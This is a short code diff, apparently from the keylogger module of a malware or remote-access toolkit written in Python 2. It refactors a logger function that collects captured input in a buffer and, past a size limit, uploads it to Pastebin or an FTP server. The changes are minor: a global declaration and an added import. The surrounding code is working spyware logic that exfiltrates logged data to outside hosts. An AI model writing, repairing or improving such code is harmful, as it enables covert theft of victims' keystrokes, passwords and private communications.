@@ -7,6 +7,7 @@ import os
 import sys
 import imp
 import json
+import time
 import base64
 import urllib
 import StringIO
@@ -163,10 +164,11 @@ def logger(mode='ftp'):
     try:
         while True:
             if globals()['_buffer'].tell() > max_bytes:
+                global _buffer
                 try:
-                    result = util.pastebin(globals()['_buffer']) if 'ftp' not in mode else util.ftp(globals()['_buffer'])
+                    result = util.pastebin(_buffer) if 'ftp' not in mode else util.ftp(_buffer)
                     results.append(result)
-                    globals()['_buffer'].reset()
+                    _buffer.reset()
                 except Exception as e:
                     util.log("{} error: {}".format(logger.func_name, str(e)))
             elif globals()['_abort']:
